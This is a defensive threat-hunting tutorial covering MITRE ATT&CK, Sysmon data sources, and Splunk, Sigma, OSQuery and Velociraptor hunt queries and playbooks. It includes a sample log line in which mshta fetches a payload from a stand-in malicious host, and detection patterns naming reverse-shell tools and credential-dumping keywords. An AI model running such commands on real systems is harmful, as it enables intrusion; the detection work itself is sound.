# Threat Hunting

> **Back to:** [Blue Team Ops](./README.md) | [Main Roadmap](../README.md)

---

## Table of Contents

1. [What is Threat Hunting?](#1-what-is-threat-hunting)
2. [Hypothesis-Driven Methodology](#2-hypothesis-driven-methodology)
3. [MITRE ATT&CK as a Hunting Guide](#3-mitre-attck-as-a-hunting-guide)
4. [Key Data Sources](#4-key-data-sources)
5. [Hunting Lateral Movement](#5-hunting-lateral-movement)
6. [Hunting Persistence Mechanisms](#6-hunting-persistence-mechanisms)
7. [Sigma Rules for Detection](#7-sigma-rules-for-detection)
8. [Velociraptor and OSQuery](#8-velociraptor-and-osquery)
9. [Creating Hunt Playbooks](#9-creating-hunt-playbooks)
10. [Practice Challenge](#10-practice-challenge)

---

## 1. What is Threat Hunting?

### Beginner Explanation

Threat hunting is the **proactive** search for threats that have already bypassed your automated defenses. While a SIEM waits for a rule to fire, a threat hunter actively asks: *"If an attacker were already inside our network, where would they be hiding, and what evidence would they leave?"*

Threat hunting assumes compromise — you're not waiting for an alert. You're going looking.

### Technical Deep Dive

Threat hunting exists on a maturity spectrum:

```
Level 0: Relies entirely on automated alerting (no hunting)
Level 1: Uses threat intelligence IoCs to search logs
Level 2: Hypothesis-driven hunts based on attacker TTPs
Level 3: Machine learning and behavioral analytics for anomaly detection
Level 4: Automated hunting pipelines with human review
```

Most organizations should target **Level 2** as a practical goal. This requires:
- A defined hunting hypothesis
- Sufficient log data to test it
- Analytical skills to distinguish malicious from benign activity

### Real-World Relevance

The **Mandiant M-Trends 2023** report found that the global median dwell time (time an attacker remains undetected) was **16 days**. Organizations with active threat hunting programs detected intrusions significantly faster. Every day an attacker dwells in your environment represents additional data exfiltration, lateral movement, and damage.

---

## 2. Hypothesis-Driven Methodology

### The Hunt Loop

```
┌─────────────────────────────────────────────────────────┐
│                    THE HUNT LOOP                        │
│                                                         │
│  1. Create Hypothesis                                   │
│     "Attackers may be using WMI for lateral movement"   │
│              │                                          │
│              ▼                                          │
│  2. Define Data Sources                                 │
│     Sysmon Event 1, 3, 19, 20; WMI logs                │
│              │                                          │
│              ▼                                          │
│  3. Collect and Analyze                                 │
│     Query SIEM, run OSQuery, examine artifacts          │
│              │                                          │
│              ▼                                          │
│  4. Identify Anomalies                                  │
│     Unusual parent/child process relationships          │
│              │                                          │
│              ▼                                          │
│  5. Triage Findings                                     │
│     Malicious → IR | Benign → Document as whitelist     │
│              │                                          │
│              ▼                                          │
│  6. Improve Defenses                                    │
│     Convert findings into SIEM detection rules          │
└─────────────────────────────────────────────────────────┘
```

### Writing a Good Hypothesis

A good hunting hypothesis has three components:

1. **Actor** — Who is the threat? (APT group, ransomware operator, insider)
2. **TTP** — What technique are they using? (Reference MITRE ATT&CK)
3. **Evidence** — What observable artifact would this produce?

**Example Hypothesis:**

> *"A threat actor using credential dumping (T1003) via LSASS access would generate a Sysmon Event ID 10 with TargetImage = lsass.exe from an unusual source process."*

**Bad hypothesis:** "Something bad is happening on our network."
**Good hypothesis:** "Attackers may be using scheduled tasks (T1053.005) for persistence, which would create EventID 4698 events from non-SYSTEM accounts during off-hours."

---

## 3. MITRE ATT&CK as a Hunting Guide

### Framework Overview

MITRE ATT&CK documents real-world attacker behaviors organized into **14 Tactics** (the *why*) containing **hundreds of Techniques** (the *how*):

| Tactic | ID | Description |
|--------|----|-------------|
| Reconnaissance | TA0043 | Gathering information before attack |
| Resource Development | TA0042 | Establishing infrastructure |
| Initial Access | TA0001 | Getting into the environment |
| Execution | TA0002 | Running malicious code |
| Persistence | TA0003 | Maintaining foothold |
| Privilege Escalation | TA0004 | Gaining higher permissions |
| Defense Evasion | TA0005 | Avoiding detection |
| Credential Access | TA0006 | Stealing credentials |
| Discovery | TA0007 | Learning the environment |
| Lateral Movement | TA0008 | Moving through the network |
| Collection | TA0009 | Gathering target data |
| Command & Control | TA0011 | Communicating with compromised systems |
| Exfiltration | TA0010 | Stealing data |
| Impact | TA0040 | Causing damage |

### Using ATT&CK Navigator for Hunt Planning

Visit [https://mitre-attack.github.io/attack-navigator/](https://mitre-attack.github.io/attack-navigator/) to:

1. **Color-code techniques** based on your detection coverage (red = no detection, green = covered)
2. **Import threat actor profiles** to see which techniques specific APTs use
3. **Plan hunts** by focusing on red cells within tactics relevant to your environment

**Prioritization approach:**

```python
# Pseudo-prioritization logic
priority_score = (technique_frequency_in_the_wild * 0.4) +
                 (impact_if_successful * 0.4) +
                 (current_detection_gap * 0.2)

# Focus hunts on high-frequency, high-impact, undetected techniques
```

---

## 4. Key Data Sources

### Process Creation (Sysmon Event ID 1)

The single most valuable data source for threat hunting. Contains:
- Process name and full path
- Command-line arguments (with arguments)
- Parent process name and ID
- File hash (MD5, SHA256)
- User context

```xml
<!-- Sysmon Event ID 1 example fields -->
<EventID>1</EventID>
<Image>C:\Windows\System32\cmd.exe</Image>
<CommandLine>cmd.exe /c whoami /all > C:\Users\Public\out.txt</CommandLine>
<ParentImage>C:\Windows\System32\mshta.exe</ParentImage>
<ParentCommandLine>mshta.exe http://malicious.example.com/payload.hta</ParentCommandLine>
<Hashes>MD5=...,SHA256=...</Hashes>
<User>CORP\jsmith</User>
```

**Why mshta.exe spawning cmd.exe is suspicious:** mshta.exe is an HTML application host — it should not be launching command interpreters in normal operation.

### Network Connections (Sysmon Event ID 3)

```
Process: powershell.exe
Source IP: 10.0.0.50:49832
Destination IP: 185.220.101.47:443
Protocol: TCP
```

Hunt for: PowerShell/wscript/mshta making outbound connections (C2 beaconing).

### Registry Changes (Sysmon Event ID 12/13)

Critical registry paths for persistence hunting:

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\SYSTEM\CurrentControlSet\Services\
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\
```

### File Modifications (Sysmon Event ID 11)

Watch for file drops in:
- `C:\Users\Public\`
- `C:\ProgramData\`
- `C:\Windows\Temp\`
- `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

---

## 5. Hunting Lateral Movement

### Pass-the-Hash (PtH) Detection

**Technique:** T1550.002 — Attackers use stolen NTLM hashes to authenticate without knowing the plaintext password.

**Hunting Query (Splunk):**

```spl
index=windows EventCode=4624
| where Logon_Type=3
| where Authentication_Package="NTLM"
| where Account_Domain != "NT AUTHORITY"
| stats count by src_ip, Account_Name, ComputerName
| where count > 1
| sort -count
```

**Key Indicator:** EventID 4624 with Logon Type 3 (Network), Authentication Package = NTLM, and the source is an unusual workstation.

**Sysmon hunting (process-based):**

```spl
index=windows EventCode=1
| where Image="*\\sekurlsa.dll" OR CommandLine="*sekurlsa*" OR CommandLine="*lsadump*"
```

### PsExec Lateral Movement Detection

**Technique:** T1021.002 — Using PsExec or similar tools to execute commands on remote systems.

```spl
index=windows (EventCode=7045 OR EventCode=4697)
| where Service_Name="PSEXESVC" OR match(Service_File_Name, "(?i)(psexe|paexec|remcom)")
| stats count by ComputerName, Service_Name, Service_Account, Service_File_Name
```

**Also look for the named pipe pattern:**

```spl
index=windows EventCode=18  # Sysmon pipe connected
| where PipeName="\PSEXESVC" OR match(PipeName, "(?i)psexe")
```

### WMI Lateral Movement

**Technique:** T1021.006 — Using Windows Management Instrumentation for remote execution (fileless, hard to detect).

```spl
# Process creation via WMI
index=windows EventCode=4688 OR (EventCode=1 AND source="sysmon")
| where ParentProcessName="WmiPrvSE.exe" OR ParentImage="*WmiPrvSE.exe*"
| where ProcessName != "msiexec.exe" AND ProcessName != "SppExtComObj.exe"
| table _time, ComputerName, ParentProcessName, ProcessName, CommandLine
```

**Sysmon WMI Event Subscription (T1546.003):**

```spl
index=windows (EventCode=19 OR EventCode=20 OR EventCode=21)
| table _time, ComputerName, EventType, Name, Query, Consumer, Filter
```

---

## 6. Hunting Persistence Mechanisms

### Scheduled Tasks (T1053.005)

```spl
# New scheduled task creation
index=windows EventCode=4698
| eval task_name=xml_field("TaskName")
| eval task_command=xml_field("Command")
| where NOT match(task_name, "(?i)(microsoft|windows|adobe|google|mozilla)")
| table _time, ComputerName, SubjectUserName, task_name, task_command
```

**OSQuery hunt for suspicious scheduled tasks:**

```sql
SELECT
  name,
  action,
  path,
  enabled,
  last_run_time,
  next_run_time
FROM scheduled_tasks
WHERE
  enabled = 1
  AND path NOT LIKE '\Microsoft\%'
  AND (
    action LIKE '%powershell%'
    OR action LIKE '%cmd%'
    OR action LIKE '%wscript%'
    OR action LIKE '%mshta%'
  );
```

### Registry Run Keys (T1547.001)

```sql
-- OSQuery: hunt for unusual run key entries
SELECT
  key,
  name,
  data,
  username
FROM registry
WHERE
  key LIKE 'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run%'
  OR key LIKE 'HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run%'
ORDER BY key, name;
```

### Malicious Services (T1543.003)

```spl
index=windows EventCode=7045
| where NOT match(Service_File_Name, "(?i)(^C:\\\\Windows|^C:\\\\Program Files|^C:\\\\ProgramData\\\\Microsoft)")
| table _time, ComputerName, Service_Name, Service_File_Name, Service_Account, Service_Start_Type
```

### Startup Folder Persistence

```sql
-- OSQuery: files in startup folders
SELECT
  path,
  size,
  type,
  datetime(mtime, 'unixepoch') as modified,
  username
FROM file
WHERE
  (
    path LIKE 'C:\Users\%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\%'
    OR path LIKE 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\%'
  )
  AND type = 'regular';
```

---

## 7. Sigma Rules for Detection

### What is Sigma?

Sigma is a **generic, open-source detection rule format** for SIEM systems. Like YARA for files and Snort rules for network traffic, Sigma provides a vendor-neutral format for log-based detections that can be converted to Splunk SPL, Elastic KQL, QRadar AQL, and more.

### Sigma Rule Anatomy

```yaml
title: Suspicious PowerShell Encoded Command
id: c7e91a02-d771-4a6d-a700-42587e0b1095
status: stable
description: Detects PowerShell launched with -EncodedCommand flag, commonly used
             to obfuscate malicious payloads
author: Your Name
date: 2024/01/15
references:
  - https://attack.mitre.org/techniques/T1027/
tags:
  - attack.defense_evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
    CommandLine|contains|all:
      - ' -'
    CommandLine|re: '(?i)-e(n(c(o(d(e(d(C(o(m(m(a(n(d)?)?)?)?)?)?)?)?)?)?)?)?\ '
  condition: selection
falsepositives:
  - Legitimate administrative scripts using encoded commands
level: medium
```

### Converting Sigma to Backend Queries

```bash
# Install sigma tools
pip install sigma-cli

# Convert to Splunk
sigma convert -t splunk rules/windows/process_creation/encoded_powershell.yml

# Convert to Elastic Query DSL
sigma convert -t elasticsearch rules/windows/process_creation/encoded_powershell.yml

# Convert to Microsoft Sentinel KQL
sigma convert -t kusto rules/windows/process_creation/encoded_powershell.yml
```

### Example Sigma Rule: PsExec Detection

```yaml
title: PsExec Service Installation
id: a8b5e5a4-2c6f-4c3d-9b1e-4f7a2d8e9c1b
status: stable
description: Detects PsExec service installation on target system
logsource:
  product: windows
  service: system
detection:
  selection:
    EventID: 7045
    ServiceName: 'PSEXESVC'
  condition: selection
level: high
tags:
  - attack.lateral_movement
  - attack.t1021.002
```

---

## 8. Velociraptor and OSQuery

### Velociraptor for Threat Hunting

**Velociraptor** is an open-source endpoint visibility and DFIR tool that allows you to deploy hunts across an entire fleet of endpoints simultaneously.

**Key concepts:**

| Concept | Description |
|---------|-------------|
| **VQL** | Velociraptor Query Language — SQL-like for endpoint data |
| **Artifact** | A reusable hunt template written in VQL |
| **Hunt** | A query pushed to multiple endpoints simultaneously |
| **Collection** | Results returned from endpoints |

**VQL Hunt: Find processes communicating with external IPs:**

```sql
-- VQL: Detect processes with external network connections
SELECT
  Pid,
  Name,
  CommandLine,
  {
    SELECT RemoteAddr, RemotePort, Status
    FROM netstat()
    WHERE RemoteAddr NOT IN ("127.0.0.1", "::1", "0.0.0.0")
    AND NOT RemoteAddr =~ "^(10\.|172\.1[6-9]\.|172\.2[0-9]\.|172\.3[01]\.|192\.168\.)"
  } AS ExternalConnections
FROM process()
WHERE ExternalConnections
```

**VQL Hunt: Find recently modified files in suspicious locations:**

```sql
SELECT
  FullPath,
  Size,
  Mtime,
  Atime,
  hash(path=FullPath, hashselect="SHA256") AS SHA256
FROM glob(globs=[
  "C:/Users/*/AppData/Roaming/*.exe",
  "C:/Users/*/AppData/Local/Temp/*.exe",
  "C:/ProgramData/*.exe"
])
WHERE Mtime > now() - 86400  -- Modified in last 24 hours
```

### OSQuery for Endpoint Visibility

OSQuery allows you to query endpoint state using SQL. Ideal for fleet-wide hunting via **Fleet** or **Kolide**.

**Hunt: Find SUID binaries (Linux privilege escalation):**

```sql
SELECT
  path,
  filename,
  permissions,
  uid,
  gid,
  size,
  datetime(mtime, 'unixepoch') as modified
FROM file
WHERE
  path LIKE '/usr/%'
  OR path LIKE '/bin/%'
  OR path LIKE '/sbin/%'
HAVING permissions LIKE '%s%';
```

**Hunt: Detect cron-based persistence:**

```sql
SELECT
  command,
  path,
  username
FROM crontab
WHERE
  command LIKE '%curl%'
  OR command LIKE '%wget%'
  OR command LIKE '%python%'
  OR command LIKE '%bash -i%'
  OR command LIKE '%nc %'
  OR command LIKE '%/dev/tcp/%';
```

**Hunt: Running processes with deleted binaries (in-memory malware):**

```sql
SELECT
  pid,
  name,
  path,
  cmdline,
  uid
FROM processes
WHERE
  on_disk = 0  -- Process binary no longer exists on disk
  AND name NOT IN ('deleted_ok_process1');
```

---

## 9. Creating Hunt Playbooks

### Playbook Structure

A threat hunt playbook is a repeatable, documented procedure. Every hunt should produce a playbook so institutional knowledge is preserved.

```markdown
# Hunt Playbook: Suspicious Scheduled Task Persistence
**Playbook ID:** HB-003
**MITRE ATT&CK:** T1053.005
**Author:** [Name]
**Last Updated:** 2024-01-15
**Frequency:** Weekly

## Hypothesis
Adversaries may be using scheduled tasks to maintain persistence
on Windows endpoints. Tasks created by non-standard accounts or
pointing to unusual executables may indicate compromise.

## Data Sources Required
- [ ] Windows Security Log (EventID 4698, 4699, 4700, 4701, 4702)
- [ ] Sysmon EventID 1 (process creation)
- [ ] Task Scheduler Operational Log

## Hunt Steps

### Step 1: Identify unusual task creation (EventID 4698)
```spl
index=windows EventCode=4698
| where SubjectUserName != "SYSTEM" AND SubjectUserName != "Administrator"
| table _time, ComputerName, SubjectUserName, TaskName, TaskContent
```

### Step 2: Identify tasks running from temp/user directories
```sql
SELECT name, action, enabled, last_run_time
FROM scheduled_tasks
WHERE action LIKE '%AppData%' OR action LIKE '%Temp%' OR action LIKE '%Public%';
```

### Step 3: Cross-reference task creation time with logon events
...

## Triage Decision Tree
- Task created by SYSTEM during software install → Likely benign, document
- Task created by user account, points to %TEMP% → Escalate to IR
- Task uses encoded PowerShell → Escalate to IR immediately

## Response Actions
If malicious task found:
1. Isolate endpoint
2. Collect task XML for forensic evidence
3. Identify parent process that created the task
4. Check for related persistence (registry run keys, services)
5. Open incident ticket

## Output / Improvements
[ ] Document benign exclusions
[ ] Create SIEM rule if pattern repeats
[ ] Update endpoint detection rule
```

---

## 10. Practice Challenge

### Hunt Challenge: Find the Intruder

**Scenario:** You are given a set of Sysmon logs from a Windows endpoint. Security operations received a tip that a machine may be compromised. No alerts have fired. Conduct a proactive threat hunt.

**Setup:**

```bash
# Download the DetectionLab environment (free, open source)
git clone https://github.com/clong/DetectionLab
cd DetectionLab/Vagrant
vagrant up

# Access Kibana at http://192.168.56.105:5601
# Credentials: vagrant/vagrant
```

**Hunt Tasks:**

1. **Enumerate all processes spawned by Office applications** (winword.exe, excel.exe) — macro-based attacks start here:
   ```spl
   index=sysmon EventCode=1
   | where ParentImage IN ("*\\WINWORD.EXE","*\\EXCEL.EXE","*\\POWERPNT.EXE")
   | table _time, ParentImage, Image, CommandLine, User
   ```

2. **Find all scheduled tasks created in the last 7 days** and investigate any pointing to non-standard paths

3. **Identify any processes making DNS queries for domains with high entropy names** (DGA indicators):
   ```spl
   index=sysmon EventCode=22
   | eval domain_len=len(QueryName)
   | where domain_len > 20 AND NOT match(QueryName, "(?i)(microsoft|google|windows|adobe)")
   | stats count by QueryName, Image
   | sort -count
   ```

4. **Write a Sigma rule** for any suspicious pattern you discover

5. **Document your findings** in a hunt playbook following the template above

**Expected Discovery:** The lab contains simulated malware artifacts. You should find at minimum: a scheduled task persistence mechanism and an unusual outbound connection.

---

*Previous: [SIEM and Log Management](./SIEM_and_Log_Management.md) | Next: [IDS/IPS Configuration](./IDS_IPS_Configuration.md)*
